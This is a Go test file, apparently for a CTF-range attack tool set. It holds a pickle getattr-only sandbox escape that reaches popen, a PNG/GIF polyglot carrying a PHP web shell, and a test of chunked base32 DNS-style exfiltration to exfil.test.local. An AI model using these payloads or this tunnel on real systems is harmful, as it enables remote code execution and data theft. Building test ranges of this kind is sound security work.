package kernel

import (
	"bytes"
	"context"
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// 合成靶场：一个「只放行 builtins.getattr 和 builtins.type」的 RestrictedUnpickler
//
// 这是 e 系列里一类题的典型形态：白名单里放的都是看起来无害的内建函数，
// 但 getattr 本身就能拼出任意属性访问。这里用 Go 复刻它的语义（不依赖 Python 运行时），
// 断言 pickle 工具生成的 opcode 流确实能在这种限制下走到 popen。
// ---------------------------------------------------------------------------

// pyVal 是极简的对象模型，只覆盖「逃逸链」经过的类型。
type pyVal struct {
	kind  string // tuple / class / func / str / int / list
	name  string
	str   string
	num   int64
	items []*pyVal
	attrs map[string]*pyVal
}

func (v *pyVal) String() string { return v.name }

// restrictedUnpickler 只认两个 GLOBAL，其余一律拒绝 —— 复刻「无害函数白名单」。
type restrictedUnpickler struct {
	stack   []*pyVal
	globals []string
}

// lastMark 找到最近的 MARK 位置。真实 unpickler 把 MARK 当成栈上的一个对象，
// 所以嵌套时必须是「栈」而不是一个下标 —— 否则内层 t 会算错边界。
func (u *restrictedUnpickler) lastMark() int {
	for i := len(u.stack) - 1; i >= 0; i-- {
		if u.stack[i].kind == "mark" {
			return i
		}
	}
	return -1
}

var (
	classObject    *pyVal
	classTuple     *pyVal
	funcGetattr    *pyVal
	funcType       *pyVal
	subclassTable  []*pyVal
	wrapCloseClass *pyVal
	popenResult    = "flag{pickle_chain_fixture}"
)

func init() {
	classObject = &pyVal{kind: "class", name: "object", attrs: map[string]*pyVal{}}
	classTuple = &pyVal{kind: "class", name: "tuple", attrs: map[string]*pyVal{"__base__": classObject}}
	classObject.attrs["__subclasses__"] = &pyVal{kind: "func", name: "object.__subclasses__"}
	funcGetattr = &pyVal{kind: "func", name: "builtins.getattr"}
	funcType = &pyVal{kind: "func", name: "builtins.type"}

	// 造一张子类表：第 141 个是 os._wrap_close，其余填充，模拟真实解释器的顺序。
	for i := 0; i < 210; i++ {
		subclassTable = append(subclassTable, &pyVal{kind: "class", name: fmt.Sprintf("dummy%d", i), attrs: map[string]*pyVal{}})
	}
	globalsMap := &pyVal{kind: "list", name: "__globals__", attrs: map[string]*pyVal{
		"popen": {kind: "func", name: "popen"},
	}}
	wrapCloseClass = &pyVal{kind: "class", name: "os._wrap_close", attrs: map[string]*pyVal{
		"__init__": {kind: "func", name: "__init__", attrs: map[string]*pyVal{"__globals__": globalsMap}},
	}}
	subclassTable[141] = wrapCloseClass
}

// call 执行链上用到的几种可调用对象。
func (v *pyVal) call(args []*pyVal) (*pyVal, error) {
	switch v.name {
	case "builtins.getattr":
		if len(args) != 2 || args[1].kind != "str" {
			return nil, fmt.Errorf("getattr 参数不对")
		}
		return getattr(args[0], args[1].str)
	case "object.__subclasses__":
		return &pyVal{kind: "list", name: "__subclasses__()", items: subclassTable}, nil
	case "__init__":
		return v, nil
	case "bound-getitem":
		if len(args) != 1 {
			return nil, fmt.Errorf("下标参数不对")
		}
		return index(v.attrs["__self__"], args[0])
	case "popen":
		if len(args) != 1 {
			return nil, fmt.Errorf("popen 参数不对")
		}
		return &pyVal{kind: "str", str: popenResult}, nil
	}
	return nil, fmt.Errorf("Forbidden: %s — only whitelisted classes allowed", v.name)
}

// getattr 复刻 Python 的属性访问（只覆盖链上需要的边）。
func getattr(target *pyVal, name string) (*pyVal, error) {
	if name == "__getitem__" {
		return &pyVal{kind: "func", name: "bound-getitem", attrs: map[string]*pyVal{"__self__": target}}, nil
	}
	if name == "__class__" {
		switch target.kind {
		case "tuple":
			return classTuple, nil
		}
	}
	if target.attrs != nil {
		if a, ok := target.attrs[name]; ok {
			return a, nil
		}
	}
	return nil, fmt.Errorf("AttributeError: %s", name)
}

// index 是 obj[idx]。
func index(obj, idx *pyVal) (*pyVal, error) {
	switch obj.kind {
	case "list":
		if idx.kind == "int" {
			if int(idx.num) < 0 || int(idx.num) >= len(obj.items) {
				return nil, fmt.Errorf("IndexError")
			}
			return obj.items[idx.num], nil
		}
		if idx.kind == "str" && obj.attrs != nil {
			if v, ok := obj.attrs[idx.str]; ok {
				return v, nil
			}
			return nil, fmt.Errorf("KeyError: %s", idx.str)
		}
	}
	return nil, fmt.Errorf("TypeError: 不可下标")
}

// run 解释 pickle 协议 0 的一个子集（只含我们生成器会产出的 opcode）。
// 注意必须按「字节」而不是按「行」解析：协议 0 里的单字符 opcode
// 本身就是相邻排列的（`( ... tR`），没有换行分隔。
func (u *restrictedUnpickler) run(data []byte) (*pyVal, error) {
	i := 0
	readLine := func() string {
		start := i
		for i < len(data) && data[i] != '\n' {
			i++
		}
		s := string(data[start:i])
		if i < len(data) {
			i++ // 跳过 \n
		}
		return s
	}
	pop := func() (*pyVal, error) {
		if len(u.stack) == 0 {
			return nil, fmt.Errorf("栈空")
		}
		v := u.stack[len(u.stack)-1]
		u.stack = u.stack[:len(u.stack)-1]
		return v, nil
	}
	for i < len(data) {
		op := data[i]
		i++
		switch op {
		case 'c': // GLOBAL：module 行 + name 行
			mod := readLine()
			name := readLine()
			u.globals = append(u.globals, mod+"."+name)
			switch {
			case mod == "builtins" && name == "getattr":
				u.stack = append(u.stack, funcGetattr)
			case mod == "builtins" && name == "type":
				u.stack = append(u.stack, funcType)
			default:
				return nil, fmt.Errorf("Forbidden: %s.%s — only whitelisted classes allowed", mod, name)
			}
		case '(':
			u.stack = append(u.stack, &pyVal{kind: "mark", name: "MARK"})
		case ')':
			u.stack = append(u.stack, &pyVal{kind: "tuple", name: "()"})
		case 't', 'l':
			m := u.lastMark()
			if m < 0 {
				return nil, fmt.Errorf("没有匹配的 MARK")
			}
			items := append([]*pyVal{}, u.stack[m+1:]...)
			u.stack = u.stack[:m]
			kind := "tuple"
			if op == 'l' {
				kind = "list"
			}
			u.stack = append(u.stack, &pyVal{kind: kind, name: "collect", items: items})
		case ']':
			u.stack = append(u.stack, &pyVal{kind: "list", name: "[]"})
		case 'N':
			u.stack = append(u.stack, &pyVal{kind: "str", name: "None"})
		case 'I':
			num, _ := strconv.ParseInt(strings.TrimSpace(readLine()), 10, 64)
			u.stack = append(u.stack, &pyVal{kind: "int", num: num})
		case 'S':
			raw := readLine()
			u.stack = append(u.stack, &pyVal{kind: "str", str: strings.TrimSuffix(strings.TrimPrefix(raw, "'"), "'")})
		case 'R': // REDUCE：栈上是 callable, args
			args, err := pop()
			if err != nil {
				return nil, err
			}
			fn, err := pop()
			if err != nil {
				return nil, err
			}
			out, err := fn.call(args.items)
			if err != nil {
				return nil, err
			}
			u.stack = append(u.stack, out)
		case '.':
			return pop()
		default:
			return nil, fmt.Errorf("未知 opcode %q（偏移 %d）", string(op), i-1)
		}
	}
	return nil, fmt.Errorf("没有 STOP")
}

// TestPickleBuildsGetattrOnlyChain 是最核心的一条：
// 生成的载荷必须「只用 builtins.getattr」就能在仅白名单 getattr 的 unpickler 里走到 popen。
func TestPickleBuildsGetattrOnlyChain(t *testing.T) {
	ts := newRangeToolSet(t)
	expr := "().__class__.__base__.__subclasses__()[141].__init__.__globals__['popen']('id')"
	out := call(t, ts, "pickle", fmt.Sprintf(`{"expr":%q}`, expr))
	if !strings.Contains(out, "builtins.getattr") {
		t.Fatalf("输出里应说明用到的 GLOBAL：\n%s", out)
	}
	b64 := extractPayload(out)
	if b64 == "" {
		t.Fatalf("没解析出 base64 载荷：\n%s", out)
	}
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		t.Fatalf("载荷不是合法 base64: %v", err)
	}
	u := &restrictedUnpickler{}
	got, err := u.run(raw)
	if err != nil {
		t.Fatalf("在「只放行 getattr」的 unpickler 里执行失败: %v\n载荷:\n%s", err, raw)
	}
	if got.str != popenResult {
		t.Fatalf("链走到了错误的对象: %q", got.str)
	}
	for _, g := range u.globals {
		if g != "builtins.getattr" {
			t.Fatalf("载荷用到了白名单之外的 GLOBAL %q —— 应该全部走 getattr", g)
		}
	}
}

// extractPayload 从工具输出里取出 base64 那一行。
func extractPayload(out string) string {
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if len(line) > 40 && !strings.Contains(line, " ") {
			if _, err := base64.StdEncoding.DecodeString(line); err == nil {
				return line
			}
		}
	}
	return ""
}

// TestPickleRejectsBadExpr 保证解析失败时给出人能读懂的错误，而不是panic。
func TestPickleRejectsBadExpr(t *testing.T) {
	ts := newRangeToolSet(t)
	for _, bad := range []string{`{"expr":"().__class__."}`, `{"expr":"('a'"}`, `{"expr":""}`} {
		out := call(t, ts, "pickle", bad)
		if out == "" {
			t.Fatalf("输入 %s 应给出错误提示", bad)
		}
		if strings.Contains(out, "panic") {
			t.Fatalf("不应 panic: %s", out)
		}
	}
}

// ---------------------------------------------------------------------------
// polyglot
// ---------------------------------------------------------------------------

func TestPolyglotPNGWithPHP(t *testing.T) {
	ts := newRangeToolSet(t)
	out := call(t, ts, "polyglot", `{"carrier":"png","payload":"<?php system($_GET[0]); ?>","save_to":"/tmp/poly.png"}`)
	if !strings.Contains(out, "主格式判别 = png") {
		t.Fatalf("应识别主格式为 png：\n%s", out)
	}
	if !strings.Contains(out, "PHP 脚本") {
		t.Fatalf("应检测到第二格式 PHP：\n%s", out)
	}
	data, err := ts.rt.ReadFile(context.Background(), "/tmp/poly.png", 1<<20)
	if err != nil {
		t.Fatalf("落盘失败: %v", err)
	}
	if !bytes.HasPrefix(data, []byte("\x89PNG\r\n\x1a\n")) {
		t.Fatalf("PNG 魔术字节不对")
	}
	if !bytes.Contains(data, []byte("<?php")) {
		t.Fatalf("payload 没进去")
	}
	// tEXt 块必须在 IEND 之前，否则解析器会把文件判成损坏
	if bytes.Index(data, []byte("tEXt")) > bytes.Index(data, []byte("IEND")) {
		t.Fatalf("tEXt 块位置不对，应在 IEND 之前")
	}
}

func TestPolyglotGIFAndPDF(t *testing.T) {
	ts := newRangeToolSet(t)
	out := call(t, ts, "polyglot", `{"carrier":"gif","payload":"<?php echo 1; ?>"}`)
	if !strings.Contains(out, "主格式判别 = gif") || !strings.Contains(out, "PHP 脚本") {
		t.Fatalf("gif 载体不对：\n%s", out)
	}
	args, _ := json.Marshal(map[string]string{"carrier": "pdf", "payload": "PK\x03\x04rest"})
	out = call(t, ts, "polyglot", string(args))
	if !strings.Contains(out, "ZIP 归档") {
		t.Fatalf("pdf 载体应能带上 ZIP 第二格式：\n%s", out)
	}
}

// ---------------------------------------------------------------------------
// tunnel：分块 + base32 + 会话复用
// ---------------------------------------------------------------------------

func TestTunnelChunkedExfil(t *testing.T) {
	const doc = "PROJECT FIXTURE — 这份文档要被完整搬到对面去，所以长度要够切成好几块。"
	got := map[string][]byte{}
	order := []int{}
	var sessionID string

	mux := http.NewServeMux()
	mux.HandleFunc("/target-data", func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(map[string]string{"content": doc})
	})
	mux.HandleFunc("/dns", func(w http.ResponseWriter, r *http.Request) {
		var body struct {
			Query   string `json:"query"`
			Session string `json:"session"`
		}
		json.NewDecoder(r.Body).Decode(&body)
		if body.Session == "" {
			sessionID = "sess-fixture-1"
		} else if body.Session != sessionID {
			t.Errorf("session 没复用: %q", body.Session)
		}
		label := strings.SplitN(body.Query, ".", 2)[0]
		parts := strings.SplitN(label, "-", 3)
		if len(parts) != 3 {
			t.Errorf("通道格式不对: %q", body.Query)
			return
		}
		seq, _ := strconv.Atoi(parts[0])
		chunk, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(parts[2])
		if err != nil {
			t.Errorf("base32 解码失败: %v", err)
			return
		}
		got[parts[1]] = append(got[parts[1]], chunk...)
		order = append(order, seq)
		json.NewEncoder(w).Encode(map[string]any{"status": "ok", "session": sessionID, "seq": seq})
	})
	mux.HandleFunc("/retrieve", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Query().Get("session") != sessionID {
			w.WriteHeader(400)
			return
		}
		assembled := ""
		for _, v := range got {
			assembled = string(v)
		}
		if assembled != doc {
			w.WriteHeader(409)
			fmt.Fprintf(w, `{"complete":false,"got":%q}`, assembled)
			return
		}
		fmt.Fprintf(w, `{"complete":true,"flag":"flag{tunnel_fixture}"}`)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	ts := newRangeToolSet(t)
	q := fmt.Sprintf(`{"source":%q,"endpoint":%q,"template":"{seq}-{total}-{chunk}.exfil.test.local",
		"chunk_size":16,"finish":"GET %s/retrieve?session={session}"}`,
		srv.URL+"/target-data", srv.URL+"/dns", srv.URL)
	out := call(t, ts, "tunnel", q)
	if !strings.Contains(out, "flag{tunnel_fixture}") {
		t.Fatalf("没取到 flag：\n%s", out)
	}
	if len(order) < 2 {
		t.Fatalf("应该切成多块，实际 %d 块", len(order))
	}
	for i, v := range order {
		if v != i {
			t.Fatalf("序号必须从 0 开始且递增，实际 %v", order)
		}
	}
}
